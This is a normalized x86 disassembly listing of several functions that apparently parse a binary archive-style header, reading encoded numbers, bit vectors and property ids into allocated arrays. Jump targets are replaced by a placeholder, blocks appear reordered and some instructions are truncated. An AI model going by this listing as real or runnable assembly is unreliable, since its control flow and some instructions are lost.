jb r-xdata
add [ ecx ] edx
sub eax edx
mov [ ecx + 0x4 ] eax
xor eax eax
pop ebp
retn
ja r-xdata
mov eax 0x10
pop ebp
retn
cmp edx eax
jbe r-xdata
sub_403150
push ebp
mov ebp esp
sub esp 0x14
lea edx [ ebp - 0x8 ]
push esi
mov esi ecx
call sub_403010
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
or eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
lea edx [ ebp - 0x10 ]
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
lea edx [ ebp - 0x8 ]
mov ecx esi
call sub_403010
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
mov eax [ esi + 0x4 ]
ja r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
jb r-xdata
sub eax ecx
add [ esi ] ecx
mov [ esi + 0x4 ] eax
cmp ecx eax
ja r-xdata
sub_4031b0
push ebp
mov ebp esp
sub esp 0x14
lea edx [ ebp - 0x8 ]
push ebx
push esi
push edi
mov esi ecx
call sub_403010
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
lea ecx [ ecx ]
or eax ecx
je r-xdata
cmp ecx edi
je r-xdata
mov eax 0x10
lea edx [ ebp - 0x10 ]
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x10 ]
jb r-xdata
add [ esi ] ecx
sub eax ecx
mov [ esi + 0x4 ] eax
xor eax eax
ja r-xdata
lea edx [ ebp - 0x8 ]
mov ecx esi
call sub_403010
test eax eax
je r-xdata
mov eax 0x10
jmp r-xdata
cmp ecx eax
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp eax ebx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
sub_403240
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
xor bh bh
xor bl bl
mov esi ecx
test edi edi
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
mov eax [ eax ]
call eax
mov ecx [ ebp + 0x8 ]
add esp 0x8
mov [ ecx ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x0
xor edx edx
test edi edi
je r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
test bl bl
jne r-xdata
mov eax [ ebp + 0x8 ]
test bh bl
mov eax [ eax ]
setne cl
mov [ edx + eax ] cl
inc edx
shr bl 0x1
cmp edx edi
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x10
pop ebx
pop ebp
retn
dec eax
mov [ esi + 0x4 ] eax
mov eax [ esi ]
inc eax
mov bh [ eax - 0x1 ]
mov [ esi ] eax
mov bl 0x80
sub_4032c0
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
pop edi
mov eax 0x10
pop esi
pop ebp
retn
dec eax
mov [ edi + 0x4 ] eax
mov eax [ edi ]
inc eax
mov cl [ eax - 0x1 ]
mov [ edi ] eax
test cl cl
jne r-xdata
test esi esi
jne r-xdata
push [ ebp + 0xc ]
mov ecx edi
push [ ebp + 0x8 ]
call sub_403240
add esp 0x8
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0xc ]
push esi
push eax
mov eax [ eax ]
call eax
mov edx [ ebp + 0x8 ]
add esp 0x8
mov [ edx ] eax
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] esi
xor ecx ecx
test esi esi
je r-xdata
pop edi
mov eax 0x2
pop esi
pop ebp
retn
pop edi
xor eax eax
pop esi
pop ebp
retn
mov eax [ edx ]
inc ecx
mov [ ecx + eax - 0x1 ] 0x1
cmp ecx esi
jb r-xdata
sub_403340
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x10 ]
push edi
push esi
push [ ebp + 0x8 ]
mov eax ecx
mov edi edx
mov [ ebp - 0x4 ] eax
call sub_4032c0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
push ebx
test edi edi
jne r-xdata
lea eax [ edi * 4 ]
push eax
mov eax [ esi ]
push esi
call eax
mov ebx [ ebp + 0xc ]
add esp 0x8
mov [ ebx ] eax
test eax eax
jne r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebx ] edi
xor esi esi
test edi edi
je r-xdata
pop ebx
pop edi
mov eax 0x2
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ esi + eax ] 0x0
je r-xdata
inc esi
cmp esi edi
jb r-xdata
mov eax [ ebx ]
mov ecx [ ebp - 0x4 ]
lea edx [ eax + esi * 4 ]
call sub_402fc0
test eax eax
jne r-xdata
pop ebx
sub_4033c0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov esi ecx
call sub_403010
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x8 ]
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
mov eax 0x4
mov edi [ ebp - 0x8 ]
cmp edi 0x80000000
jae r-xdata
test eax eax
jne r-xdata
cmp edi 0x4000000
jae r-xdata
mov ebx [ ebp + 0x8 ]
push eax
push 0x9
mov ecx esi
mov [ ebx ] edi
call sub_4031b0
add esp 0x8
test eax eax
jne r-xdata
test edi edi
jne r-xdata
lea eax [ edi * 8 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ eax ]
call eax
mov ecx [ ebp + 0xc ]
add esp 0x8
mov [ ecx ] eax
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] edi
jmp r-xdata
mov eax ecx
mov eax 0x2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edi edi
cmp [ ebx ] edi
jbe r-xdata
lea edx [ ebp - 0x8 ]
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
lea ecx [ ecx ]
mov edi [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
inc edi
cmp edi [ ebx ]
jb r-xdata
cmp [ edi ] 0x0
jne r-xdata
cmp edx 0xa
jne r-xdata
mov eax [ eax ]
mov ecx esi
lea edx [ eax + edi * 8 ]
call sub_403010
test eax eax
jne r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
mov esi [ ebp + 0x18 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
test ecx ecx
jne r-xdata
push eax
mov eax [ esi ]
push esi
call eax
add esp 0x8
mov [ edi ] eax
test eax eax
je r-xdata
mov [ edi ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x10 ]
jb r-xdata
push [ ebp + 0x18 ]
mov edx [ ebx ]
push [ ebp + 0x14 ]
mov ecx esi
push edi
call sub_403340
add esp 0xc
jmp r-xdata
mov eax [ ebx ]
test eax eax
jne r-xdata
add [ esi ] ecx
sub eax ecx
mov [ esi + 0x4 ] eax
xor eax eax
ja r-xdata
test eax eax
jne r-xdata
shl eax 0x2
push eax
mov eax [ esi ]
push esi
call eax
mov edx [ ebp + 0x14 ]
add esp 0x8
mov [ edx ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ecx esi
call sub_403010
test eax eax
je r-xdata
mov eax 0x10
jmp r-xdata
cmp ecx eax
jbe r-xdata
xor ecx ecx
cmp [ ebx ] ecx
jbe r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax edx
or eax ecx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ecx ]
mov eax [ edi ]
inc ecx
mov [ ecx + eax - 0x1 ] 0x0
mov eax [ edx ]
mov [ eax + ecx * 4 - 0x4 ] 0x0
cmp ecx [ ebx ]
jb r-xdata
sub_4035a0
mov edx ecx
mov eax [ edx + 0x4 ]
test eax eax
je r-xdata
mov eax 0x10
retn
dec eax
mov [ edx + 0x4 ] eax
mov eax [ edx ]
inc eax
mov cl [ eax - 0x1 ]
mov [ edx ] eax
xor edx edx
mov eax 0x4
test cl cl
cmove eax edx
retn
sub_4035d0
push ebp
mov ebp esp
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
xor ecx ecx
mov ebx edx
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x40 ] ecx
push edi
lea edx [ ebp - 0x54 ]
mov ecx esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x30 ] eax
call sub_403010
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x50 ]
test eax eax
jne r-xdata
mov eax 0x4
mov edi [ ebp - 0x54 ]
cmp edi 0x80000000
jae r-xdata
test eax eax
jne r-xdata
cmp edi 0x4000000
jae r-xdata
cmp edi 0x20
ja r-xdata
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
lea eax [ edi + edi * 2 ]
shl eax 0x3
push eax
mov eax [ ebp - 0x34 ]
push eax
mov eax [ eax ]
call eax
add esp 0x8
mov [ ebx ] eax
test eax eax
jne r-xdata
mov [ ebx ] edi
test edi edi
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov [ ebp - 0x44 ] 0x0
test edi edi
je r-xdata
xor ecx ecx
mov edx edi
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x2c ] ecx
lea esp [ esp ]
mov eax [ ebx ]
lea ecx [ ecx + 0x18 ]
mov [ eax + ecx - 0x8 ] 0x0
mov [ eax + ecx - 0x4 ] 0x0
dec edx
jne r-xdata
mov eax 0x10
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ esi ]
dec ecx
mov [ esi + 0x4 ] ecx
mov bl [ eax ]
mov [ ebp - 0x19 ] bl
movzx ebx bl
lea edx [ eax + 0x1 ]
mov [ esi ] edx
mov edi 0x0
and ebx 0xf
jbe r-xdata
cmp ebx 0x8
ja r-xdata
nop
mov edi [ ebp - 0x24 ]
mov [ edi + 0x8 ] 0x0
mov [ edi + 0xc ] 0x0
test ebx ebx
je r-xdata
dec ecx
mov [ esi + 0x4 ] ecx
mov al [ edx ]
mov [ ebp + edi - 0x18 ] al
inc edx
inc edi
mov [ esi ] edx
cmp edi ebx
jb r-xdata
mov bl [ ebp - 0x19 ]
test bl 0x10
je r-xdata
lea eax [ ebp + ebx - 0x19 ]
xor esi esi
mov [ ebp - 0x24 ] eax
test ecx ecx
je r-xdata
mov [ edi ] 0x1
mov [ edi + 0x4 ] 0x1
lea edx [ ebp - 0x64 ]
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
movzx eax [ eax ]
cdq
mov ecx esi
call sub_430160
or [ edi + 0x8 ] eax
mov eax [ ebp - 0x24 ]
or [ edi + 0xc ] edx
dec eax
add esi 0x8
mov [ ebp - 0x24 ] eax
dec ebx
jne r-xdata
mov esi [ ebp - 0x28 ]
test bl bl
jns r-xdata
xorps xmm0 xmm0
lea edx [ ebp - 0x6c ]
mov ecx esi
movlpd [ ebp - 0x6c ] xmm0
call sub_403010
test eax eax
jne r-xdata
mov ecx [ ebp - 0x60 ]
test ecx ecx
ja r-xdata
mov eax [ ebp - 0x30 ]
add eax [ edi ]
mov edx [ ebp - 0x44 ]
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x40 ]
add eax [ edi + 0x4 ]
inc edx
add ecx 0x18
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x2c ] ecx
cmp edx [ ebp - 0x54 ]
jae r-xdata
nop
mov ebx [ ebp - 0x6c ]
mov [ edi + 0x14 ] eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x64 ]
jb r-xdata
test eax eax
je r-xdata
mov ebx [ ebp - 0x20 ]
jmp r-xdata
mov eax [ esi ]
inc eax
dec ecx
mov [ esi + 0x4 ] ecx
mov bl [ eax - 0x1 ]
mov [ ebp - 0x24 ] eax
mov [ esi ] eax
mov al bl
and al 0xf
movzx eax al
cdq
test edx edx
ja r-xdata
mov eax [ ebp - 0x34 ]
push ebx
push eax
mov eax [ eax ]
call eax
add esp 0x8
mov [ edi + 0x10 ] eax
test eax eax
je r-xdata
mov [ edi + 0x10 ] ebx
jmp r-xdata
lea edx [ ebp - 0x74 ]
mov ecx esi
mov [ edi ] eax
call sub_403010
test eax eax
jne r-xdata
cmp eax 0x80000000
jae r-xdata
lea ebx [ eax - 0x1 ]
mov eax [ ebp - 0x20 ]
mov [ eax + 0x14 ] ebx
test ebx ebx
jne r-xdata
mov eax [ ebx ]
add eax ecx
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x24 ] eax
test ecx ecx
je r-xdata
jb r-xdata
mov [ edi + 0x14 ] ebx
mov edx [ edi + 0x10 ]
push ebx
mov ecx esi
call sub_402f80
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp - 0x70 ]
test ecx ecx
ja r-xdata
test ecx ecx
ja r-xdata
lea eax [ ebx * 8 ]
push eax
mov eax [ ebp - 0x34 ]
push eax
mov eax [ eax ]
call eax
mov ecx [ ebp - 0x20 ]
add esp 0x8
mov [ ecx + 0x4 ] eax
test eax eax
je r-xdata
mov [ eax + 0x4 ] ebx
jmp r-xdata
sub ecx eax
add eax [ ebp - 0x24 ]
mov [ esi + 0x4 ] ecx
mov [ esi ] eax
test bl 0x10
je r-xdata
cmp eax ecx
ja r-xdata
mov bl [ ebp - 0x19 ]
mov eax [ ebp - 0x74 ]
jb r-xdata
jb r-xdata
mov eax ecx
xor edi edi
test ebx ebx
je r-xdata
test bl 0x20
je r-xdata
lea edx [ ebp - 0x4c ]
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
cmp [ edi ] 0x20
mov [ edi + 0x4 ] eax
ja r-xdata
cmp eax 0x80000000
jae r-xdata
cmp eax 0x4000000
jae r-xdata
mov eax [ ebp - 0x30 ]
cmp eax ebx
jb r-xdata
lea ebx [ ebx ]
test bl bl
js r-xdata
xorps xmm0 xmm0
lea edx [ ebp - 0x5c ]
mov ecx esi
movlpd [ ebp - 0x5c ] xmm0
call sub_403010
test eax eax
jne r-xdata
mov eax [ ebp - 0x48 ]
test eax eax
ja r-xdata
cmp eax 0x20
jbe r-xdata
test ecx ecx
ja r-xdata
mov ebx eax
mov eax [ ebp - 0x40 ]
dec eax
sub ebx eax
mov eax [ ebp - 0x20 ]
mov [ eax + 0x18 ] ebx
jne r-xdata
mov ecx [ ebp - 0x38 ]
test ecx ecx
ja r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ esi + 0x4 ]
ja r-xdata
mov ecx [ ebp - 0x4c ]
jb r-xdata
test bl 0x20
je r-xdata
jb r-xdata
lea eax [ ebx * 4 ]
push eax
mov eax [ ebp - 0x34 ]
push eax
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp - 0x20 ]
add esp 0x8
mov [ ebp - 0x28 ] edi
mov [ eax + 0x8 ] edi
test edi edi
je r-xdata
mov [ eax + 0x8 ] 0x0
mov eax [ ebp - 0x3c ]
jb r-xdata
mov ecx [ ebp - 0x5c ]
jb r-xdata
lea edx [ ebp - 0x3c ]
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
cmp ecx 0x80000000
jae r-xdata
cmp eax 0x4000000
jae r-xdata
cmp ebx 0x1
jne r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ eax + 0x8 ]
lea edx [ ebp - 0x3c ]
lea eax [ eax + edi * 4 ]
mov ecx esi
mov [ ebp - 0x28 ] eax
call sub_403010
test eax eax
jne r-xdata
mov ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x4c ]
mov [ ecx ] eax
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
cmp eax 0x80000000
jae r-xdata
sub eax ecx
add [ esi ] ecx
mov [ esi + 0x4 ] eax
cmp ecx eax
ja r-xdata
mov eax [ ebp - 0x38 ]
test eax eax
ja r-xdata
test eax eax
ja r-xdata
xor edi edi
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x30 ]
xor edx edx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x38 ]
test ecx ecx
ja r-xdata
mov ecx [ ebp - 0x48 ]
test ecx ecx
ja r-xdata
test ecx ecx
ja r-xdata
mov ecx [ ebp - 0x3c ]
jb r-xdata
jb r-xdata
cmp edx ebx
je r-xdata
mov edi eax
mov esi [ edi + 0x14 ]
mov eax [ ebp - 0x3c ]
jb r-xdata
mov eax [ ebp - 0x4c ]
jb r-xdata
jb r-xdata
cmp ecx 0x80000000
jae r-xdata
cmp ecx 0x4000000
jae r-xdata
mov [ edi ] edx
mov edi [ ebp - 0x28 ]
mov ecx [ edi + 0x4 ]
mov ecx [ ebp - 0x28 ]
inc edi
mov [ ecx ] eax
cmp edi ebx
jae r-xdata
cmp eax 0x80000000
jae r-xdata
mov ecx [ ebp - 0x2c ]
inc edi
mov [ ecx + 0x4 ] eax
cmp edi ebx
jae r-xdata
cmp eax 0x80000000
jae r-xdata
cmp eax 0x4000000
jae r-xdata
test eax eax
ja r-xdata
test eax eax
js r-xdata
inc eax
add ecx 0x8
cmp eax esi
jb r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
test ecx ecx
ja r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
test ecx ecx
ja r-xdata
jb r-xdata
inc edx
cmp edx ebx
jb r-xdata
cmp [ ecx ] edx
je r-xdata
jmp r-xdata
jb r-xdata
mov eax [ eax + 0x4 ]
lea edx [ ebp - 0x3c ]
lea eax [ eax + edi * 8 ]
mov ecx esi
mov [ ebp - 0x2c ] eax
call sub_403010
test eax eax
jne r-xdata
jb r-xdata
cmp ecx 0x4000000
jae r-xdata
xor eax eax
test esi esi
je r-xdata
cmp eax 0x4000000
jae r-xdata
cmp eax 0x4000000
jae r-xdata
sub_403ba0
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push 0x0
push 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x18 ] esi
call sub_4031b0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x20 ]
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
jne r-xdata
mov eax 0x4
mov edx [ ebp - 0x20 ]
cmp edx 0x80000000
jae r-xdata
test eax eax
jne r-xdata
cmp edx 0x4000000
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ ebx ] edx
test eax eax
je r-xdata
mov eax 0x10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec eax
mov [ esi + 0x4 ] eax
mov eax [ esi ]
inc eax
mov cl [ eax - 0x1 ]
xor edi edi
mov [ esi ] eax
test cl cl
mov eax 0x4
cmove eax edi
test eax eax
jne r-xdata
test edx edx
jne r-xdata
lea eax [ edx + edx * 4 ]
shl eax 0x3
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call eax
mov ecx [ ebp + 0x8 ]
add esp 0x8
mov [ ecx ] eax
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
xor ecx ecx
cmp [ ebx ] ecx
jbe r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edi edi
cmp [ ebx ] edi
jbe r-xdata
mov esi [ ebp + 0x8 ]
xor edx edx
lea esp [ esp ]
push 0x0
push 0xc
mov ecx esi
call sub_4031b0
add esp 0x8
test eax eax
jne r-xdata
xor ebx ebx
mov eax [ esi ]
add eax edx
inc ecx
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x14 ] edi
mov [ eax + 0x18 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0x20 ] edi
mov [ eax + 0x24 ] edi
add edx 0x28
cmp ecx [ ebx ]
jb r-xdata
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebx ] eax
jbe r-xdata
mov eax [ ebp - 0x8 ]
inc edi
add ebx 0x28
cmp edi [ eax ]
jb r-xdata
lea edx [ ebp - 0x20 ]
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov edx [ eax ]
add edx ebx
mov ecx esi
call sub_4035d0
add esp 0x4
test eax eax
jne r-xdata
mov ebx eax
lea ecx [ ecx ]
shl eax 0x3
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call eax
add esp 0x8
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0xa
jne r-xdata
mov eax [ ebp - 0x14 ]
xor edi edi
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
test edx edx
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
inc edi
add eax 0x28
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] eax
cmp edi [ ebx ]
jb r-xdata
mov eax [ ebx + 0xc ]
mov ecx esi
lea edx [ eax + edi * 8 ]
call sub_403010
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x28 ]
jb r-xdata
mov edi [ ebx ]
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x14 ] edi
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
add ebx eax
mov ecx ebx
call sub_402b60
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
inc edi
cmp edi [ ebp - 0x14 ]
jb r-xdata
add [ esi ] ecx
sub eax ecx
mov [ esi + 0x4 ] eax
xor eax eax
ja r-xdata
mov ebx 0x10
dec eax
mov [ esi + 0x4 ] eax
mov eax [ esi ]
inc eax
mov cl [ eax - 0x1 ]
mov [ esi ] eax
test cl cl
jne r-xdata
lea edx [ ebp - 0x20 ]
mov ecx esi
call sub_403010
test eax eax
jne r-xdata
mov eax 0x10
jmp r-xdata
cmp ecx eax
jbe r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test edi edi
jne r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
mov ecx esi
call sub_403240
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x8 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ebx [ ebp + 0x10 ]
push edi
mov eax [ ebx ]
push ebx
call eax
add esp 0x8
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
xor eax eax
xor ecx ecx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edi [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov eax ecx
or eax edx
je r-xdata
test edi edi
je r-xdata
lea ebx [ eax + 0x2 ]
jmp r-xdata
xor ebx ebx
test edi edi
je r-xdata
test edi edi
jne r-xdata
push [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
push eax
mov eax [ eax + 0x4 ]
call eax
mov eax [ ebp + 0x10 ]
push edi
push eax
mov eax [ eax + 0x4 ]
call eax
add esp 0x10
test ebx ebx
je r-xdata
xor ecx ecx
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov ecx edi
mov edi [ ebp - 0x4 ]
mov edx ecx
shr ecx 0x2
mov eax 0x1010101
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ ebp - 0x4 ]
mov edi [ ebp - 0x14 ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
xor ebx ebx
xor edx edx
mov [ ebp - 0x14 ] ebx
cmp [ ecx ] edx
jbe r-xdata
mov edi ecx
mov ecx [ ebp - 0x14 ]
lea eax [ edi * 4 ]
push eax
mov eax [ ebx ]
push ebx
call eax
mov ebx eax
add esp 0x8
mov [ ebp - 0xc ] ebx
test ebx ebx
jne r-xdata
mov esi [ ebp - 0xc ]
xor edi edi
mov ebx ecx
inc ebx
add edi 0x4
cmp ebx ecx
jb r-xdata
mov [ edi ] 0x0
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
lea ebx [ eax + 0x2 ]
jmp r-xdata
movzx eax [ eax + edx ]
mov ecx [ ebp + 0x8 ]
inc edx
mov ecx [ ecx ]
lea edi [ edi + 0x28 ]
mov [ ecx + edi - 0xc ] eax
mov eax [ esi + edx * 4 - 0x4 ]
mov [ ecx + edi - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp edx [ ebx ]
jb r-xdata
mov esi [ ebp - 0x18 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
cmp [ ebx + eax ] 0x0
je r-xdata
dec eax
mov [ esi + 0x4 ] eax
mov eax [ esi ]
inc eax
mov cl [ eax - 0x1 ]
mov [ esi ] eax
movzx eax cl
mov ecx edx
shl eax cl
add edx 0x8
or [ edi ] eax
cmp edx 0x20
jl r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
sub_403fa0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
mov ebx edx
push edi
mov edi ecx
xorps xmm0 xmm0
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x18 ] edi
movlpd [ ebp - 0x28 ] xmm0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
test ebx ebx
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx edi
mov [ edx ] ebx
lea edx [ ebp - 0x28 ]
call sub_403010
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x24
mov ecx ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov [ eax ] 0x1
lea eax [ eax + 0x28 ]
dec ecx
jne r-xdata
mov ebx [ ebp - 0x28 ]
mov esi [ ebp - 0x24 ]
cmp ebx 0xd
jne r-xdata
cmp ebx 0xa
jne r-xdata
test esi esi
jne r-xdata
cmp ebx 0x9
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
cmp [ ebp - 0xc ] esi
jbe r-xdata
mov eax ebx
or eax esi
je r-xdata
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x28 ]
mov ecx edi
call sub_403010
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
add ebx 0x24
lea edx [ ebp - 0x30 ]
mov ecx edi
call sub_403010
test eax eax
jne r-xdata
shl eax 0x3
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ eax ]
call eax
mov ecx [ ebp + 0x10 ]
add esp 0x8
mov [ ecx ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x34 ]
test ecx ecx
ja r-xdata
cmp [ ebp - 0x2c ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ ebp - 0x30 ]
jb r-xdata
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x1c ]
push eax
mov eax [ eax ]
call eax
mov ecx [ ebp + 0x14 ]
add esp 0x8
mov [ ecx ] eax
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
xor eax eax
